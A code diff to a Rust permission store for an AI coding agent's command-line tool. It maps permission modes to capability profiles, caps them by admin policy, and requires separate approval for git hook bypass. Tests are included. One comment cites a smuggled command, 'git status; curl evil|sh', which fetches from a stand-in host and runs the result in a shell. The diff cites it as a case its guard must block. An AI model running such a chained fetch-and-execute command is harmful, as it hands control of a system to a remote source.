@@ -1,8 +1,14 @@
+use agiworkforce_protocol::code_domain::{
+    AdminPolicyCap, CodeCapabilities, CodeCapability, CodePermissionProfile, PermissionDecision,
+    PermissionProfileId,
+};
 use anyhow::{Context, Result};
 use serde::{Deserialize, Serialize};
 use std::collections::HashSet;
 use std::path::{Path, PathBuf};
 use std::sync::{LazyLock, Mutex};
+
+use crate::cli_options::PermissionMode;
 
 // AUDIT-FIX: C-2, token-prefix match prevents `git status; curl evil|sh` slipping past a `git status` allow.
 fn token_prefix_matches(entry: &str, candidate_tokens: &[&str]) -> bool {
@@ -142,6 +148,74 @@ pub struct PermissionStore {
     /// current or past sessions. Not persisted, session-only.
     #[serde(skip)]
     pub recently_denied: Vec<String>,
+
+    /// The permission mode this session is running under, which names the
+    /// profile the stored rules sit inside. Session-only: the mode belongs to
+    /// the invocation, not to the machine.
+    #[serde(skip)]
+    pub active_mode: Option<PermissionMode>,
+}
+
+/// The capability a stored command rule decides, for the capabilities a rule
+/// can name. Hook bypass is absent on purpose: `--no-verify` is a flag on
+/// another command, not a command prefix a user can allow.
+const CAPABILITY_COMMANDS: &[(CodeCapability, &str)] = &[
+    (CodeCapability::GitCommit, "git commit"),
+    (CodeCapability::GitPush, "git push"),
+    (CodeCapability::GitHistoryRewrite, "git rebase"),
+];
+
+/// The canonical profile a permission mode names.
+pub fn permission_profile_for(mode: Option<PermissionMode>) -> CodePermissionProfile {
+    match mode.unwrap_or_default() {
+        PermissionMode::Default => CodePermissionProfile::standard(),
+        PermissionMode::Plan => {
+            let mut profile = CodePermissionProfile::read_only();
+            profile.id = PermissionProfileId::new("plan");
+            profile.name = "Plan".to_string();
+            profile
+        }
+        PermissionMode::AcceptEdits => {
+            let mut profile = CodePermissionProfile::standard();
+            profile.id = PermissionProfileId::new("accept-edits");
+            profile.name = "Accept edits".to_string();
+            profile.capabilities.file_write = PermissionDecision::Allow;
+            profile
+        }
+        PermissionMode::BypassPermissions => {
+            let mut profile = CodePermissionProfile::full_access();
+            profile.id = PermissionProfileId::new("bypass-permissions");
+            profile.name = "Bypass permissions".to_string();
+            profile.capabilities = CodeCapabilities::uniform(PermissionDecision::Allow);
+            profile
+        }
+        PermissionMode::DontAsk => {
+            let mut profile = CodePermissionProfile::standard();
+            profile.id = PermissionProfileId::new("dont-ask");
+            profile.name = "Headless".to_string();
+            for capability in CodeCapability::ALL {
+                if profile.capabilities.get(*capability) == PermissionDecision::Ask {
+                    profile
+                        .capabilities
+                        .set(*capability, PermissionDecision::Deny);
+                }
+            }
+            profile
+        }
+    }
+}
+
+pub fn permission_profile_id(mode: Option<PermissionMode>) -> PermissionProfileId {
+    permission_profile_for(mode).id
+}
+
+fn persisted_active_mode() -> Option<PermissionMode> {
+    crate::config::CliConfig::load()
+        .ok()?
+        .default
+        .permission_mode
+        .as_deref()
+        .and_then(crate::cli_options::persisted_permission_mode)
 }
 
 impl PermissionStore {
@@ -159,6 +233,7 @@ impl PermissionStore {
             Self::default()
         };
         store.session_allow = process_session_allow_snapshot();
+        store.active_mode = persisted_active_mode();
         Ok(store)
     }
 
@@ -231,6 +306,58 @@ impl PermissionStore {
         }
 
         self.check(command_program).or_else(|| self.check(base_cmd))
+    }
+
+    /// Like [`PermissionStore::check_command`], except that an allow saved for
+    /// a command does not carry over to the same command with the repository's
+    /// hooks turned off. A stored `git commit` prefix-matches
+    /// `git commit --no-verify`, and the two are not the same decision, so the
+    /// bypass has to be named by the rule that allows it.
+    pub fn check_command_allowing_hook_bypass(&self, command: &str) -> Option<bool> {
+        let decision = self.check_command(command);
+        if decision != Some(true) || !crate::safety::bypasses_git_hooks(command) {
+            return decision;
+        }
+        let tokens: Vec<&str> = command.split_whitespace().collect();
+        let named = self
+            .always_allow
+            .iter()
+            .chain(self.session_allow.iter())
+            .any(|rule| {
+                crate::safety::bypasses_git_hooks(rule) && token_prefix_matches(rule, &tokens)
+            });
+        named.then_some(true)
+    }
+
+    fn stored_decision(&self, command: &str) -> Option<PermissionDecision> {
+        match self.check_command(command) {
+            Some(true) => Some(PermissionDecision::Allow),
+            Some(false) => Some(PermissionDecision::Deny),
+            None => self
+                .ask_list
+                .iter()
+                .any(|rule| rule.pattern == command)
+                .then_some(PermissionDecision::Ask),
+        }
+    }
+
+    /// The canonical permission profile this session runs under: the profile
+    /// its mode names, narrowed by the rules the user actually stored, then by
+    /// admin policy.
+    pub fn code_permission_profile(
+        &self,
+        admin_cap: Option<AdminPolicyCap>,
+    ) -> CodePermissionProfile {
+        let mut profile = permission_profile_for(self.active_mode);
+        for (capability, command) in CAPABILITY_COMMANDS {
+            if let Some(decision) = self.stored_decision(command) {
+                profile.capabilities.set(*capability, decision);
+            }
+        }
+        match admin_cap {
+            Some(cap) => profile.under_admin_cap(cap),
+            None => profile,
+        }
     }
 
     /// Check a path-scoped file mutation rule. File rules use exact keys so
@@ -477,6 +604,10 @@ impl PermissionStore {
 
         let mut out = String::new();
         out.push_str(&format!("Permissions:  {}\n\n", tab_header.join("  ")));
+        out.push_str(&format!(
+            "  Active profile: {}\n",
+            self.code_permission_profile(None).display_label()
+        ));
         out.push_str(&format!("  {}\n\n", hint));
         out.push_str("  Search…\n\n");
 
@@ -776,6 +907,137 @@ mod tests {
         assert!(display.contains("[Workspace]"));
         assert!(display.contains("cargo build"));
         assert!(display.contains("Workspace rules apply only in this directory."));
+    }
+
+    #[test]
+    fn a_mode_names_a_profile_and_commit_is_not_push() {
+        let standard = permission_profile_for(None);
+        assert_eq!(standard.name, "Standard");
+        assert_eq!(
+            standard.decision(CodeCapability::GitCommit),
+            PermissionDecision::Ask
+        );
+        assert_eq!(
+            standard.decision(CodeCapability::GitHookBypass),
+            PermissionDecision::Deny,
+            "hooks are not bypassed by default"
+        );
+
+        let plan = permission_profile_for(Some(PermissionMode::Plan));
+        assert_eq!(plan.id.as_str(), "plan");
+        assert_eq!(
+            plan.decision(CodeCapability::FileWrite),
+            PermissionDecision::Deny
+        );
+
+        let headless = permission_profile_for(Some(PermissionMode::DontAsk));
+        assert_eq!(
+            headless.decision(CodeCapability::GitPush),
+            PermissionDecision::Deny,
+            "a prompt nobody can answer is a refusal"
+        );
+
+        let accept_edits = permission_profile_for(Some(PermissionMode::AcceptEdits));
+        assert_eq!(
+            accept_edits.decision(CodeCapability::FileWrite),
+            PermissionDecision::Allow
+        );
+        assert_eq!(
+            accept_edits.decision(CodeCapability::GitPush),
+            PermissionDecision::Ask
+        );
+    }
+
+    #[test]
+    fn stored_rules_decide_the_profiles_git_capabilities() {
+        let mut store = PermissionStore::default();
+        store.allow_always("git commit");
+        store.deny_always("git push");
+
+        let profile = store.code_permission_profile(None);
+
+        assert_eq!(
+            profile.decision(CodeCapability::GitCommit),
+            PermissionDecision::Allow
+        );
+        assert_eq!(
+            profile.decision(CodeCapability::GitPush),
+            PermissionDecision::Deny
+        );
+    }
+
+    #[test]
+    fn admin_policy_caps_what_a_stored_rule_allowed() {
+        let mut store = PermissionStore {
+            active_mode: Some(PermissionMode::BypassPermissions),
+            ..PermissionStore::default()
+        };
+        store.allow_always("git push");
+
+        let profile = store.code_permission_profile(Some(AdminPolicyCap::new(
+            "workspace policy",
+            CodeCapabilities {
+                git_push: PermissionDecision::Deny,
+                ..CodeCapabilities::uniform(PermissionDecision::Allow)
+            },
+        )));
+
+        assert_eq!(
+            profile.decision(CodeCapability::GitPush),
+            PermissionDecision::Deny
+        );
+        assert!(profile.capped_by_admin(CodeCapability::GitPush));
+        assert_eq!(
+            profile.display_label(),
+            "Bypass permissions (capped by workspace policy)"
+        );
+    }
+
+    #[test]
+    fn an_allow_for_a_command_is_not_an_allow_for_bypassing_its_hooks() {
+        let mut store = PermissionStore::default();
+        store.allow_always("git commit");
+
+        assert_eq!(store.check_command("git commit -m wip"), Some(true));
+        assert_eq!(
+            store.check_command("git commit --no-verify -m wip"),
+            Some(true),
+            "the prefix match is what makes the guard necessary"
+        );
+        assert_eq!(
+            store.check_command_allowing_hook_bypass("git commit --no-verify -m wip"),
+            None,
+            "a hook bypass needs its own decision"
+        );
+
+        store.allow_always("git commit --no-verify");
+        assert_eq!(
+            store.check_command_allowing_hook_bypass("git commit --no-verify -m wip"),
+            Some(true)
+        );
+    }
+
+    #[test]
+    fn a_denied_command_stays_denied_whether_or_not_it_bypasses_hooks() {
+        let mut store = PermissionStore::default();
+        store.deny_always("git push");
+
+        assert_eq!(
+            store.check_command_allowing_hook_bypass("git push --no-verify origin main"),
+            Some(false)
+        );
+    }
+
+    #[test]
+    fn the_permissions_view_names_the_active_profile() {
+        let store = PermissionStore {
+            active_mode: Some(PermissionMode::Plan),
+            ..PermissionStore::default()
+        };
+
+        let display = store.display_tab("allow");
+
+        assert!(display.contains("Active profile: Plan"));
     }
 
     #[test]
